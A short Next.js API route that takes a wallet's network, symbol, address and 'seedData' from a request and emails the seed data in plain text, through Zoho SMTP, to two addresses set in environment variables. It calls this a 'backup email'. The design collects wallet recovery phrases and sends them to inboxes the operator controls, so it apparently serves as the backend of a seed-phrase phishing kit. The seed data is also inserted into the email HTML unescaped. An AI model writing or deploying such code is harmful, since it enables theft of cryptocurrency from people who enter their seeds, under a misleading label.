import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { network, symbol, walletAddress, seedData, timestamp } = body

    // Validate required fields
    if (!network || !symbol || !walletAddress || !seedData) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    // Create transporter using environment variables
    const transporter = nodemailer.createTransport({
      service: 'zoho', // true for 465, false for other ports
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD,
      },
    })

    // Get recipients array from environment variables
    const recipients = [
      process.env.BACKUP_EMAIL_1,
      process.env.BACKUP_EMAIL_2
    ].filter((email): email is string => Boolean(email))

    if (recipients.length === 0) {
      return NextResponse.json(
        { error: 'No backup email addresses configured' },
        { status: 500 }
      )
    }

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipients,
      subject: network,
      text: seedData,
      html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${seedData}</pre>`,
    }

    // Send email
    await transporter.sendMail(mailOptions)

    return NextResponse.json(
      { success: true, message: 'Backup email sent successfully' },
      { status: 200 }
    )

  } catch (error) {
    console.error('Email sending error:', error)
    return NextResponse.json(
      { error: 'Failed to send backup email' },
      { status: 500 }
    )
  }
}
